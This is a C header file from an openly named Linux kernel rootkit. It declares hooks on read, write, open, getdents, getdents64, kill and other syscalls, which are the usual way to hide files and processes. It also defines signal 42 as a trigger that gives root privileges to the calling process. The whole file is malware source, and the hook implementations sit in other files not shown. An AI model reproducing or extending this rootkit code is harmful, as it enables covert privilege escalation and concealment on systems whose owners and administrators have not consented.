#ifndef _ROOTKIT_ROOTKIT_MAIN_H_
#define _ROOTKIT_ROOTKIT_MAIN_H_

#include "hooking.h"
#include "macro_utils.h"
#include "utils.h"

#define P_SYSCALL_HOOKS  (p_syscall_hooks)
#define NR_SYSCALL_HOOKS (ARRAY_SIZE(P_SYSCALL_HOOKS))

#define SIGROOT 42 /* The signal to send to elevate the current process to root */

/**
 * Defines how to name a syscall hook handler function.
 * The function name is `_new_<syscall_name>_handler`.
 *
 * @param _syscall_name The syscall name
 * @return The hook handler function name
 */
#define HOOK_HANDLER_NAME(_syscall_name) _new_##_syscall_name##_handler

// Array of the original syscall function references.
sysfun_t p_orig_sysfuns[__NR_syscalls] = { NULL };

INIT_HOOK_HANDLERS(P_SYSCALL_HOOKS, read, write, open, pread64, sendfile, getdents, getdents64,
                   getpid, kill)

// Define signal handler array
const signal_handler_t p_sig_handlers[] = {
    NEW_SIGNAL_HANDLER(-1, SIGROOT, give_root),
};

#endif
